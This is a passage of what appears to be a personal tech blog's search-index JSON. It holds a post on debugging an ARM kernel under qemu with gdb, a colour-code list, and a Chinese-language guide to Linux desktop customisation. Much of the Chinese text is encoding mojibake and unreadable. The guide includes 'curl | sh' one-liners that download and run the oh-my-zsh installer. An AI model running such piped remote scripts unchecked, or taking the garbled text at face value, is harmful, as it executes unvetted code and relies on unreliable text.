\u0026#34;o\\nn\\np\\n1\\n\\n\\nw\u0026#34; | sudo /sbin/fdisk rootfs.img With disk partition be ready, rootfs.img could be mounted to the host filesystem using kpartx :\n1 sudo kpartx -a -s -v rootfs.img After that we got the corresponding device located at /dev/mapper/loop0p1\nFormat its major partition as ext2 format :\n1 2 mkfs.ext2 /dev/mapper/loop0p1 sync And then mount it to host filesystem path wherever you like :\n1 sudo mount /dev/mapper/loop0p1 ./mount_dir We are done preparing here. All we should do next is copying all the files recursively from the origin root filesystem directory to our mounted directory, so that we got a rootfs.img image file containing the armel filesystem we want. Don\u0026rsquo;t forget replace the origin bin/busybox with our manually compiled version.\nTracing time ! Now we have :\n1 2 workdir $ ls mount_dir rootfs.img vmlinux zImage Full system emulation command line :\n1 qemu-system-arm -M virt -kernel ./zImage -drive if=none,file=rootfs.img,format=raw,id=rootfs -device virtio-blk-device,drive=rootfs -append \u0026#34;root=/dev/vda1 console=ttyS0 rw\u0026#34; -nographic -s -S tips : -s shorthand for -gdb tcp::1234 -S freeze CPU at startup (use \u0026lsquo;c\u0026rsquo; to start execution) Terminate qemu-system-arm process with Ctrl-A + x\nqemu-system-arm process should be paused until we attach to it using gdb-multiarch:\n1 2 3 4 5 6 ~$ gdb-multiarch (gdb)$ set architecture arm The target architecture is set to \u0026#34;arm\u0026#34;. (gdb)$ file vmlinux Reading symbols from vmlinux... (gdb)$ target remote :1234 We can not reach the bootloader\u0026rsquo;s entry address 0x7c00 because we are not using our own bootloader and pass the -bios parameter to qemu.\nIf you want to learn how kernel initialize itself, just use :\n1 2 (gdb)$ b kernel_init (gdb)$ c After a bunch of initializing work on memory, paging, hardware and drive, etc being done, the init binary (who has PID 1) is about to be execved. The problem is, init is a usermode process and running in ring3, which has the different thread with kernel and virtual memory space, how we trace to it? The answer is straightforward: the program counter register (PC) is always holding the instruction\u0026rsquo;s virtual address being excuted by CPU. So we can just check the entry address of init, and set a breakpoint at this address. Because I am using busybox to supply init, and this binary is belong to armel architecture, so I should typing :\n1 arm-buildroot-linux-uclibcgnueabi-readelf -h mount_dir/bin/busybox It gave me :\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 ELF Header: Magic: 7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 Class: ELF32 Data: 2\u0026#39;s complement, little endian Version: 1 (current) OS/ABI: UNIX - System V ABI Version: 0 Type: EXEC (Executable file) Machine: ARM Version: 0x1 Entry point address: 0x87a0 Start of program headers: 52 (bytes into file) Start of section headers: 4008884 (bytes into file) Flags: 0x5000202, has entry point, Version5 EABI, soft-float ABI Size of this header: 52 (bytes) Size of program headers: 32 (bytes) Number of program headers: 5 Size of section headers: 40 (bytes) Number of section headers: 30 Section header string table index: 27 We find that the entry point address is 0x87a0. 0x87a0 is such a strange address that seems can not be a breakpoint address. The reason is that busybox is not compiled with CFLAG -no-pie. so add this CFLAG and compile busybox again, we will get the avaliable breakpoint address by readelf. So set a breakpoint at busybox\u0026rsquo;s entry address and send c to gdb, we will reach to userspace directly.\n","date":"2022-05-08T19:35:11+08:00","image":"https://s2.loli.net/2022/08/25/fHQPn8S2vLI7aR3.png","permalink":"https://cerr.cc/post/cross-debug-old-version-kernel-using-qemu-system/","title":"Cross debug old version kernel using qemu-system"},{"content":"Awesome colors æ³¢å°”å¤šçº¢ #4f0009 å…‹è±å› è“ #002FA7 æ™®é²å£«è“ #003153 å‹ƒè‰®ç¬¬çº¢ #800020 é‚¦è¿ªè“ #0095b6 æœ¨ä¹ƒä¼Šæ£• #8f4b28 å¡å¸ƒé‡Œè“ #1a5599 æé¦™çº¢ #b05923 è’‚èŠ™å°¼è“ #81d8d0 è¦†ç›†å­çº¢ #9e2e24 è™çš®é»„ #e2af42 è–„è·ç»¿ #407d52 è‰é»„ #cfb64a æ˜Ÿè“ #9ab4cd é¸¢å°¾è“ #418ab4 è‹‹èœç´« #8e2961 é’¢è“ #101420 äº‘å³°ç™½ #dae3e6 å²©çŸ³æ£• #8c502c æ©„æ¦„çŸ³ç»¿ #b8ce8e ç«¹ç»¿ #4fa485 é’´è“ #4692b9 æœˆå½±ç™½ #c2c4c3 ç¬‹çš®æ£• #6b331a ç‰ç’ƒè“ #22406a é»›è“ #3f4f65 é’ç™½ #bee0d0 å¢¨è‰² #4e606c é»¯ #3f545b ç„é’ #3b3a4e æ¼†é»‘ #141722 ç„è‰² #370708 ","date":"2022-05-07T22:53:05+08:00","image":"https://s2.loli.net/2022/05/07/QW6X8VuxZCJnmfc.jpg","permalink":"https://cerr.cc/post/awesome-colors/","title":"Awesome Colors"},{"content":" GNU/Linux çš„æ¡Œé¢ç”Ÿæ€ï¼Œå¼€æ”¾è™½æ˜¯å¥½äº‹ï¼Œä½†å´ç”±æ­¤å¸¦æ¥äº†æ··ä¹±ã€‚æ²¡æœ‰åƒå¾®è½¯è¿™æ ·çš„èµ›åšä¸­å¤®æ”¿åºœåˆ¶å®šè§„åˆ™ï¼Œå°±äº§ç”Ÿäº†çœ¼ä¸‹è¿™èˆ¬ç¾¤é›„å‰²æ®çš„æ€åŠ¿ã€‚ä½œä¸ºç”¨æˆ·çš„æˆ‘èƒ½åšçš„ï¼Œä¹Ÿåªæ˜¯æ‹©å·¨æœ¨è€Œæ – â€”â€” å”¯äºŒçš„è‡ªç”±å·¨å¤´ KDE ä¸ Gnomeï¼ŒäºŒé€‰å…¶ä¸€~~ï¼ˆLXQtå¤§æ³•å¥½ï¼‰~~ï¼ˆå½“å¹´ç…®é…’è®ºDEï¼Œä»Šæ—¥å›é€ƒç”¨WMï¼‰ï¼ˆi3å¤§æ³•å¥½ï¼‰ã€‚å¹¼å¹´æ°”ç››ï¼Œçˆ±å¥½æŠ˜è…¾ï¼Œç•™ä¸‹äº†äº›è®¸ç¾åŒ–çš„ç»éªŒã€‚æ—¶è‡³ä»Šæ—¥ï¼Œèƒ½å›å¿†èµ·çš„å·²ç„¶ä¸å¤šã€‚å°½åŠ›è€Œä¸ºåšäº›è®°å½•ï¼Œä¸ºæ—¥åå›å½’èµ›åšå·¦æ´¾ç•™äº›ç›˜ç¼ ã€‚\næ¦‚å¿µæ‹†è§£ è¢«Windowsé©¯åŒ–å¾—æ¸©é¡ºä»è‰¯çš„æˆ‘ï¼Œå½“å¹´å¯¹æ˜¾ç¤ºå±ä¸ŠèŠ±èŠ±ç»¿ç»¿çš„GUIç»„ä»¶å¹¶æ— æ¦‚å¿µã€‚å•†ä¸šæ“ä½œç³»ç»Ÿå°†ä¸€åˆ‡æ•´åˆï¼Œæˆä¸ºä¸€ä¸ªæ•´ä½“ï¼Œè¿·æƒ‘æˆ‘è¯´ï¼šâ€œè¿™ä¾¿æ˜¯æ“ä½œç³»ç»Ÿå›¾å½¢åŒ–ç”¨æˆ·æ¥å£â€ã€‚ä»Šæ—¥æ…¢æ…¢çˆ¬å‡ºæ³¥æ²¼ï¼Œç•™æ”»ç•¥å¦‚ä¸‹ï¼š\nğŸµæˆ‘æœ‰ä¸€å°æ ‘è“æ´¾æˆ‘ä»æ¥ä¸å¼€æœºã€‚æ¥é€šç”µæºã€å¼•å¯¼å™¨é†’æ¥ã€å¯åŠ¨å†…æ ¸ã€å”¤é†’pid 1ï¼Œæ­¤æ—¶æ¥åˆ°Virtual Terminalä¸‹çš„/dev/tty1ã€‚åœ¨è‡ªåŠ¨ç™»å½•GUIçš„è®¾å®šä¸‹ï¼Œæœ‰å¦‚ä¸‹æœ‹å‹å…ˆåä¼šæ¥è¿æ¥æˆ‘ï¼š\nWSï¼šWindow System å›¾å½¢åŒ–çš„åŸºæœ¬ç¯å¢ƒ ä¸¾ä¾‹ï¼š X11 Wayland refï¼š https://en.wikipedia.org/wiki/Windowing_system DMï¼šDisplay manager å›¾å½¢åŒ–çš„ç™»é™†ç®¡ç†å™¨ï¼Œä½œç”¨ç±»ä¼¼äºloginç¨‹åº å¯ä»¥åœ¨æ­¤é€‰æ‹©ç™»å½•åæƒ³è¦å¯åŠ¨çš„WMæˆ–DE ä¸¾ä¾‹ï¼š GDM, GNOME implementation SDDM, recommended display manager for KDE Plasma 5 and LXQt. Successor to KDM. LightDM, a lightweight, modular, cross-desktop, fully themeable desktop display manager by Canonical Ltd. refï¼š https://en.wikipedia.org/wiki/X_display_manager WMï¼šWindow manager æ§åˆ¶çª—å£è¡Œä¸ºçš„å›¾å½¢åŒ–å­ç³»ç»Ÿ ä¸¾ä¾‹ï¼š i3ï¼ˆfor X11ï¼‰ Swayï¼ˆi3 clone for Waylandï¼‰ KWin Openbox refï¼š https://en.wikipedia.org/wiki/Window_manager https://en.wikipedia.org/wiki/Comparison_of_X_window_managers DEï¼šDesktop environment ä¼ ç»Ÿæ„ä¹‰ä¸Šçš„â€œæ¡Œé¢ç¯å¢ƒâ€ï¼Œç™»å½•åç›´æ¥æ˜¾ç¤ºåˆ°å±å¹•ä¸Šçš„å›¾å½¢å¤§éƒ½æ˜¯DEç”»çš„ï¼ˆicons, windows, toolbars, folders, wallpapers and desktop widgetsï¼‰ ä¸¾ä¾‹ï¼š Gnome KDE XFCE LXDEï¼ˆGTKï¼‰ LXQtï¼ˆQtï¼‰ DDEï¼ˆå›½äº§ï¼‰ refï¼š https://en.wikipedia.org/wiki/Desktop_environment DE KDE plasma UIçš„ï¼ˆä¹¡åœŸé£ï¼‰ç°ä»£æ„Ÿï¼Œå¾ˆå¤§éƒ¨åˆ†è¦å½’å› ä¸é€æ˜åŒ–çš„æ•ˆæœã€‚ä¸€å¹´å‰çš„æˆ‘ä¹Ÿæ˜¯é€æ˜åŒ–çˆ±å¥½è€…ï¼Œæ°é€¢é‚£æ—¶ä½¿ç”¨ Archlinux + KDEï¼Œæ•…è®°å½•å¦‚ä¸‹KDEé€æ˜åŒ–é…ç½®æ–¹æ³•ã€‚KDEè‡ªèº«æœ¬å°±å…·æœ‰å„å¤§DEä¸­æœ€ä¸ºå¼ºå¤§çš„è§†è§‰æ•ˆæœå®šåˆ¶åŠŸèƒ½ï¼Œæ‰€ä»¥å¦‚ä¸‹æ‰€è¿°åªæ˜¯KDEæœ¬èº«èƒ½åŠ›ä¹‹å¤–çš„ç¾åŒ–æ–¹æ³•ï¼š\nçª—å£è¾¹æ¡†é€æ˜åŒ– ä½¿ç”¨\nhttps://github.com/ishovkun/SierraBreeze æˆ–\nhttps://github.com/alex47/BreezeBlurred åœ¨Archlinuxä¸Šè‹¥å‡ºç°ç¼–è¯‘é”™è¯¯ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä½è€å“¥æ‰“åŒ…å¥½çš„å®‰è£…åŒ… https://github.com/alex47/BreezeBlurred/issues/24 é¢æ¿é€æ˜åŒ– éœ€è¦è‡ªå·±é­”æ”¹ï¼Œå‚è€ƒå¦‚ä¸‹å¤§ä½¬ç•™ä¸‹çš„æ•™ç¨‹ï¼š\nhttps://www.joxrays.com/kde-panel-transparency/\nåŸå§‹è®ºå›å¸–å­ï¼š\nhttps://forum.manjaro.org/t/where-can-the-transparency-of-the-kde-panel-be-set/50219\nç»„ä»¶é€æ˜åŒ– è¿™ä¸€éœ€æ±‚æœ‰ç°æˆçš„å·¥å…·Kvantumï¼Œäº¦æœ‰å¤§ä½¬æ•™ç¨‹å¦‚ä¸‹ï¼š\nhttps://blog.firerain.me/article/4\næ­¤å¤–ï¼Œä¾¿æ˜¯ä¸€äº›å…¶å®ƒçš„æ•ˆæœç»„ä»¶\nMacOSé£çš„Dockæ  çŠ¶æ€ã€èœå•ã€ä»»åŠ¡æ çš„å‘ˆç°æ–¹å¼ï¼Œæˆ‘ä¸ªäººæ›´å€¾å‘ä¸MacOSçš„æ–¹æ¡ˆã€‚æ¯”èµ·Windowsï¼Œç‰ºç‰²äº†äº›è®¸æ•ˆç‡ï¼Œæ¢å–ç¾æ„Ÿã€‚\nKDEä¸‹ä½¿ç”¨ latte-dock æ¥è·å–MacOSé£çš„Dockæ ï¼Œè¿™æ ·å°±å¯ä»¥å°†æœ¬èº«çš„Panelå˜ä¸ºMacOSä¸‹çš„å¸¸é©»çŠ¶æ€æ ã€‚\nä»“åº“åœ°å€ï¼šhttps://github.com/KDE/latte-dock\nåŒæ—¶å…¶æ˜¯å¯ä»¥ç›´æ¥ä»KDE storeä¸€é”®ä¸‹è½½å®‰è£…çš„ã€‚\néŸ³ä¹å¯è§†åŒ– Windowsä¸‹å¯ä»¥ä½¿ç”¨Wallpaper engineï¼ŒLinuxå°±æ²¡æœ‰è¿™ä¸ªç¦åˆ†äº†ï¼Œåªèƒ½å¦å¯»æ›¿ä»£æ–¹æ¡ˆã€‚\nKDEæ’ä»¶ panon èƒ½è¾¾åˆ°å°šä¸”å‡‘æ´»çš„æ•ˆæœï¼Œå¯ä»¥ç›´æ¥ä»æ’ä»¶å•†åº—ä¸€é”®å®‰è£…ã€‚\nGnome Gnomeä¸åƒKDEï¼Œå®ƒæ²¡æœ‰å‘ç”¨æˆ·ç›´æ¥å‘ˆç°DE UIå®šåˆ¶æ¥å£ï¼Œè€Œæ˜¯éœ€è¦ç”¨æˆ·è‡ªè¡Œé…ç½®ã€‚å¥½åœ¨GnomeåŒæ—¶ä¹Ÿæä¾›äº†ç¾åŒ–æ€»ç«™ï¼šhttps://www.gnome-look.org/\nç½‘ç«™ä¸­åŸºæœ¬æ¶µç›–äº†æ‰€æœ‰ç¾åŒ–é€‰é¡¹ä¸èµ„æºã€‚ä¸”å¯¹äºé‡‡ç”¨GTKçš„å…¶å®ƒDEæ¥è¯´ï¼Œå¤§é‡èµ„æºéƒ½æ˜¯é€šç”¨çš„ã€‚ä½†åœ¨æ­¤ä¹‹å‰éœ€è¦æœ‰ä¸€äº›é¢„å…ˆé…ç½®ï¼ˆå‡ºäºDEç¨³å®šæ€§è€ƒè™‘ï¼Œé»˜è®¤ä¸å°†å®šåˆ¶æ¥å£æä¾›ç»™å°ç™½ç”¨æˆ·ï¼‰ï¼š\nå®‰è£… gnome-tweaks\n1 sudo apt install gnome-tweaks ä½¿ç”¨gnome-tweakså°±å¯ä»¥åšä¸€äº›æ­¤å‰æ²¡æœ‰çš„å®šåˆ¶åŒ–äº†ï¼ŒåŒæ—¶ä½œä¸ºåç»­ç¾åŒ–çš„åŸºæœ¬ä¾èµ–ã€‚\næ¥ä¸‹æ¥å®‰è£…gnomeæ’ä»¶ç®¡ç†å™¨ GNOME Shell Extensionsï¼š\næ’ä»¶ç®¡ç†å™¨çš„ç”¨æˆ·æ¥å£æ˜¯åŸºäºæµè§ˆå™¨æä¾›çš„ï¼Œéœ€å®‰è£…å¯¹åº”çš„Chromeæˆ–Firefoxæ’ä»¶å³å¯ã€‚\nå¯¹äºChromeï¼Œé™¤äº†å¯ä»¥ä»Chromeå•†åº—ä¸‹è½½å¤–ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨è½¯ä»¶æºé‡Œçš„åŒ…å®‰è£…ï¼š\n1 sudo apt install chrome-gnome-shell Firefoxæ’ä»¶åœ°å€ä¸ºï¼šhttps://addons.mozilla.org/en-US/firefox/addon/gnome-shell-integration/\nç„¶åå°±å¯ä»¥è®¿é—® https://extensions.gnome.org/ æ¥ç®¡ç†gnomeæ’ä»¶äº†ï¼š\nä¸ºäº†ä½¿ç”¨ç”¨æˆ·ç›®å½•ä¸­çš„ä¸»é¢˜ï¼Œéœ€è¦å®‰è£… User Themes æ’ä»¶å¹¶å¯ç”¨ï¼š\nhttps://extensions.gnome.org/extension/19/user-themes/\nç„¶ååœ¨å®¶ç›®å½•å»ºç«‹åä¸º .themes çš„æ–‡ä»¶å¤¹ï¼Œå°†ä¸‹è½½åˆ°çš„å„ç§ä¸»é¢˜èµ„æºè§£å‹è‡³æ­¤ã€‚\nè‹¥ä¸æƒ³è¿›è¡Œç”¨æˆ·çº§å®‰è£…ï¼Œè€Œæ˜¯è¿½æ±‚ç³»ç»Ÿçº§å®‰è£…ï¼Œåˆ™èµ„æºè·¯å¾„ä¸ºï¼š\nä¸»é¢˜ï¼š/usr/share/themes/ å›¾æ ‡ï¼š/usr/share/icons/ å­—ä½“ï¼š/usr/share/fonts/ æ­¤åï¼Œå°½æƒ…æ¢ç´¢https://www.gnome-look.org/ï¼Œå°†ä¸‹è½½åˆ°çš„èµ„æºåœ¨gnome-tweaksä¸­å¯ç”¨å³å¯ã€‚\nWM i3 è®¨åŒé¼ æ ‡çš„é”®ç›˜ä¿¡å¾’ï¼Ÿä¿ºä¹Ÿä¸€æ ·ï¼ï¼ˆå³ä½¿æˆ‘æ˜¯è€FPSç©å®¶äº†ï¼Œä½¿ç”¨é¼ æ ‡æœ‰å¤©ç„¶çš„é€Ÿåº¦ä¼˜åŠ¿ï¼‰\nè¯è¯´å›¾å½¢åŒ–è¯ç”Ÿçš„åˆè¡·å°±å¸¦æœ‰â€œåæ ‡äº¤äº’â€çš„åŠ¨æœºï¼Œæƒ³åœ¨å›¾å½¢åŒ–ä¸‹æ‰”æ‰é¼ æ ‡ï¼Œä¸æ˜¯æŠ›å¼ƒåŸæ•™æ—¨äº†å˜›ï¼Ÿ\nä½†æœ‰éœ€æ±‚å°±æœ‰é€ ç‰©ï¼Œç©DEçš„åè·¯æ˜¯ç©WMã€‚i3ç›®å‰æ˜¯è¯¥é¢†åŸŸçš„å½“çº¢ç‚¸å­é¸¡ã€‚\nä¸å–œæ¬¢X11ï¼Ÿé¢å‘Waylandçš„i3 cloneï¼šSwayï¼Œä¾›ä½ é€‰æ‹©ã€‚\nå¿«æ·é”®å¹¶ä¸å¤šï¼Œæ¯”tmuxç®€å•ã€‚ä¸€å¤©å­¦ä¼šï¼Œå—ç”¨ç»ˆç”Ÿã€‚ğŸ‘\nShell shellå¹¶ä¸å±äºDEçš„ä¸€éƒ¨åˆ†ï¼Œæœ‰ä¸ªå­—ç¬¦ç»ˆç«¯è¶³çŸ£ã€‚\næœ€æµè¡Œçš„ç¾åŒ–æ–¹æ¡ˆè¿˜æ˜¯zshçš„ä¸€å¥—ï¼š\nzsh sudo apt install zsh oh-my-zshï¼š å®˜ç½‘ï¼šhttps://ohmyz.sh/ å®˜æ–¹ä¸€é”®å®‰è£…ï¼ˆåŸºäºraw.githubusercontent.comï¼Œéœ€ç§‘å­¦ä¸Šç½‘ï¼‰ï¼š sh -c \u0026quot;$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\u0026quot; åŸºäºå›½å†…giteeé•œåƒä¸€é”®å®‰è£…ï¼š sh -c \u0026quot;$(curl -fsSL https://gitee.com/mirrors/oh-my-zsh/raw/master/tools/install.sh)\u0026quot; lsd https://github.com/Peltoche/lsd éœ€è¦Nerd Fontsæ”¯æŒ https://www.nerdfonts.com/ zshæ’ä»¶ è¾“å…¥å»ºè®®æ’ä»¶ï¼šzsh-autosuggestions åŸºäºoh-my-zshå®‰è£…ï¼šgit clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions shellè¯­æ³•é«˜äº®æ’ä»¶ï¼šzsh-syntax-highlighting åŸºäºoh-my-zshå®‰è£…ï¼šgit clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting fishä¹Ÿä¸é”™ï¼Œå¼€ç®±å³ç”¨ï¼Œä½†æƒœè´¥äºä¸å…¼å®¹bash\nå…¶å®ƒ ç¨‹åºå¤ªå°ä»¥è‡³äºä¸€å¥è¯å°±è¯´å®Œäº†â€¦â€¦\nç»ˆç«¯é…è‰² ç»ˆç«¯æ¨¡æ‹Ÿå™¨å±‚ å¦‚ä¸‹ä»“åº“ï¼Œåº”æœ‰å°½æœ‰ï¼š\nhttps://github.com/mbadolato/iTerm2-Color-Schemes\nshellå±‚ shellå±‚çš„é…è‰²åªæ˜¯ç”¨è‰²å·æŒ‡å®šé¢œè‰²ï¼Œä½†ç›¸åº”é¢œè‰²å…·ä½“é•¿ä»€ä¹ˆæ ·è¿˜å¾—çœ‹ä¸Šè¿°ç»ˆç«¯æ¨¡æ‹Ÿå™¨å±‚ä¸­å®šä¹‰çš„RGBå€¼ã€‚\næˆ‘è‡ªå·±æ¯”è¾ƒå–œæ¬¢ZSH_THEME=\u0026quot;robbyrussell\u0026quot;çš„é…è‰²ï¼š\n1 export LS_COLORS=\u0026#34;rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:\u0026#34; refï¼š\nhttps://askubuntu.com/questions/466198/how-do-i-change-the-color-for-directories-with-ls-in-the-console http://www.bigsoft.co.uk/blog/2008/04/11/configuring-ls_colors https://geoff.greer.fm/lscolors/ grub æ¥è‡ªgnome-lookï¼Œä½†å•¥éƒ½èƒ½ç”¨ï¼Œæ¯•ç«Ÿå®šåˆ¶çš„æ˜¯grubè¿™ä¸ªå¼•å¯¼å™¨ï¼š\nhttps://www.gnome-look.org/browse/cat/109/order/latest/\næ¡Œé¢çŠ¶æ€ç›‘æµ‹å™¨ ä½¿ç”¨ conkyï¼Œä»“åº“å¦‚ä¸‹ï¼š\nhttps://github.com/brndnmtthws/conky\nè£¸ä½“ç»ˆç«¯æ¨¡æ‹Ÿå™¨ fbtermå¥½ä¸œè¥¿ï¼Œä»“åº“å¦‚ä¸‹ï¼š\nhttps://github.com/sfzhi/fbterm\nå‚è€ƒ https://zjuyk.gitlab.io/posts/i3wm-config/ ","date":"2022-05-07T22:50:57+08:00","image":"https://s2.loli.net/2022/05/07/wqH1K7UnExrO4V5.jpg","permalink":"https://cerr.cc/post/%E5%85%B3%E4%BA%8Elinux-ui%E7%9A%84%E7%BE%8E%E5%8C%96%E5%B7%A5%E4%BD%9C/","title":"å…³äºLinux UIçš„ç¾åŒ–å·¥ä½œ"}]